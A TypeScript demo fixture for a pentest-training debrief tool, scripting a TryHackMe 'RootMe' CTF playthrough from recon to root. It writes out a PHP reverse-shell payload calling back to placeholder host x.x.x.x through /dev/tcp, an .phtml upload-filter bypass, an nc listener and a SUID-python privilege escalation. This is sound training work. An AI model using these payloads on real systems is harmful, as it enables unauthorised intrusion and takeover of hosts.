/**
 * A scripted end-to-end playthrough of a REAL THM room ("RootMe", free-tier Easy), used to demo the
 * debrief live the same way abducted.ts does: DemoDriver streams these commands into the store one
 * at a time, recording: true, so the report builds live before resolving into the final graded
 * debrief. No box, no capture agent, browser-only.
 *
 * Source: transcribed from two public write-ups (fetched via WebFetch), cross-checked against each
 * other for the command path:
 *   https://steflan-security.com/tryhackme-rootme-walkthrough/
 *   https://www.jalblas.com/blog/tryhackme-rootme-walkthrough/
 * The command path (15 steps) is the REAL RootMe chain both write-ups document: nmap service recon
 * on the Apache/OpenSSH box, a gobuster content-discovery sweep that surfaces `/panel` (an image
 * upload form) and `/uploads`, an extension-filter bypass (the form blocks `.php`/`.php3`-`.php5`
 * but not `.phtml`) to land a PHP reverse shell as `www-data`, a `python -c 'import pty; ...'` tty
 * upgrade, the user flag under `/var/www`, a `find ... -perm /4000` SUID sweep that turns up a
 * root-owned `/usr/bin/python`, and the GTFOBins `os.execl("/bin/sh", "sh", "-p")` swap to a root
 * shell. Outputs below are reconstructed from the write-ups' prose/terminal excerpts, not
 * copy-pasted verbatim.
 *
 * One content adjustment, noted per the task-3 precedent (equivalence-preserving, not a library
 * change): the upload payload is written as a compact PHP one-liner —
 * `system("bash -c 'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1'")` — rather than quoting pentestmonkey's
 * full php-reverse-shell.php (the script both write-ups actually used). Same effect (a `bash -i`
 * reverse shell landing on the attacker's listener at `x.x.x.x:1234`, matching the `nc -lvnp 1234`
 * below), and it keeps the transcript short; it also happens to be the same shell text/pattern the
 * deterministic MITRE classifier's reverse-shell override matches on (see
 * `src/lib/pipeline/mitre.ts`), so the payload-authoring step correctly classifies as Execution
 * (TA0002) rather than falling through to the generic low-confidence default for an unrecognized
 * `echo` invocation.
 *
 * Redaction (public_safe fixture — enforced by rootme.test.ts): both THM-style flags the write-ups
 * quote (the room's user and root flags) are replaced with `[flag]`; the target is
 * always the hostname `rootme.thm` (no live TryHackMe lab IP anywhere); the attacker callback
 * address is `x.x.x.x`.
 *
 * Timings are realistic for an Easy room (~20-minute run); the driver reveals one command every
 * ~1.5s, so it's a time-compressed replay. One methodology check a more thorough approach would run
 * — fingerprinting the web stack (`whatweb`/`curl -I`) before diving into content discovery — is
 * never touched in this transcript, so it stays skipped for a believable "what you'd do differently".
 */
import type { GoldenObjective, Session } from "../../types/report";
import { buildRaw, makeDemo, type Step } from "./build";

const START = Date.parse("2026-07-08T14:00:00Z");

const STEPS: Step[] = [
  // --- Recon: services, web content discovery ---
  { cmd: "nmap -sV -sC -v rootme.thm", gap: 2_000, dur: 25_000, lines: 12, volume: 1_000, out: "22/tcp OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 · 80/tcp Apache httpd 2.4.29 (Ubuntu) — Ubuntu 18.04 web server" },
  { cmd: "gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", gap: 20_000, dur: 90_000, lines: 14, volume: 3_000, out: "/css (Status: 301) · /js (Status: 301) · /panel (Status: 301) · /uploads (Status: 301) · /index.php (Status: 200)" },
  { cmd: "curl -s http://rootme.thm/panel/", gap: 15_000, dur: 900, lines: 6, out: '<form action="upload.php" method="post" enctype="multipart/form-data"> — an image upload panel; page text warns "PHP files are not allowed!"' },

  // --- Exploitation: extension-filter bypass, PHP reverse shell as www-data ---
  { cmd: 'echo \'<?php system("bash -c \\\'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\\\'"); ?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml — the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter; system() calls back to x.x.x.x:1234" },
  { cmd: "nc -lvnp 1234", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 1234 ..." },
  { cmd: 'curl -F "file=@shell.phtml" http://rootme.thm/panel/upload.php', gap: 10_000, dur: 2_200, lines: 2, out: "200 OK — Successfully uploaded! stored as /uploads/shell.phtml" },
  { cmd: "curl http://rootme.thm/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs — system() spawned the bash -i reverse shell against x.x.x.x:1234; www-data@rootme:/var/www/html$ (caught on the listener)" },
  { cmd: "id", gap: 4_000, dur: 300, lines: 1, out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
  { cmd: "python -c \"import pty; pty.spawn('/bin/bash')\"", gap: 5_000, dur: 800, lines: 1, out: "www-data@rootme:/var/www/html$ — upgraded the dumb pipe to a real pty" },

  // --- Orient, capture user flag ---
  { cmd: "find / -type f -iname user.txt 2>/dev/null", gap: 30_000, dur: 6_000, lines: 1, out: "/var/www/user.txt" },
  { cmd: "cat /var/www/user.txt", gap: 3_000, dur: 300, lines: 1, out: "[flag]" },

  // --- Privesc: SUID python, GTFOBins ---
  { cmd: "find / -user root -perm /4000 2>/dev/null", gap: 60_000, dur: 5_000, lines: 9, out: "/usr/bin/python — the one non-standard entry alongside the usual passwd/su/sudo/mount SUID set" },
  { cmd: 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', gap: 15_000, dur: 500, lines: 1, out: "# — /usr/bin/python is SUID root; GTFOBins' execl swap spawns /bin/sh -p, preserving the euid" },
  { cmd: "whoami", gap: 2_000, dur: 200, lines: 1, out: "root" },
  { cmd: "cat /root/root.txt", gap: 5_000, dur: 300, lines: 1, out: "[flag]" },
];

const DEMO_END = buildRaw(STEPS, START).at(-1)!.ended_at_ms;

export const ROOTME_SESSION: Session = {
  uuid: "demo-rootme-0001-0001-000000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "TryHackMe :: RootMe",
  context_path: "host",
  shell: "bash",
  source: "local_pty",
  machine: { name: "RootMe", os: "Linux", difficulty: "Easy" },
};

/**
 * The intended path from the (real) write-ups. `fingerprint_webserver` (a `whatweb`/`curl -I`
 * tech-stack check before content discovery) is never run in this transcript, so it stays skipped —
 * both source write-ups go straight from the nmap service scan into gobuster.
 */
export const ROOTME_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "fingerprint_webserver", tactic: "TA0007", satisfied_by: ["whatweb", "curl -I"], depends_on: ["enumerate_services"] },
  { objective: "discover_web_directories", tactic: "TA0007", satisfied_by: ["gobuster"], depends_on: ["enumerate_services"] },
  { objective: "identify_upload_panel", tactic: "TA0007", satisfied_by: ["curl"], depends_on: ["discover_web_directories"] },
  { objective: "exploit_upload_bypass", tactic: "TA0002", satisfied_by: ["echo"], depends_on: ["identify_upload_panel"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["nc", "ncat"], depends_on: ["exploit_upload_bypass"] },
  { objective: "orient_as_www_data", tactic: "TA0004", satisfied_by: ["id", "whoami"], depends_on: ["get_foothold"] },
  { objective: "stabilize_shell", tactic: "TA0002", satisfied_by: ["python -c"], depends_on: ["orient_as_www_data"] },
  { objective: "locate_user_flag", tactic: "TA0004", satisfied_by: ["find"], depends_on: ["stabilize_shell"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["cat"], depends_on: ["locate_user_flag"] },
  { objective: "find_suid_binaries", tactic: "TA0004", satisfied_by: ["find"], depends_on: ["capture_user_flag"] },
  { objective: "exploit_suid_python", tactic: "TA0002", satisfied_by: ["python -c"], depends_on: ["find_suid_binaries"] },
  { objective: "escalate_to_root", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["exploit_suid_python"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["cat"], depends_on: ["escalate_to_root"] },
];

/**
 * The fully-resolved demo, built through the shared registry pipeline (build.ts): raw commands,
 * graded report, and stable id all derive from the same STEPS/session/golden above. Pre-registered
 * in the store so a "RootMe" card always shows in History; opening it replays the run live (see
 * runLiveDemo).
 */
export const ROOTME = makeDemo({ platform: "thm", slug: "rootme", session: ROOTME_SESSION, steps: STEPS, golden: ROOTME_GOLDEN, startMs: START });
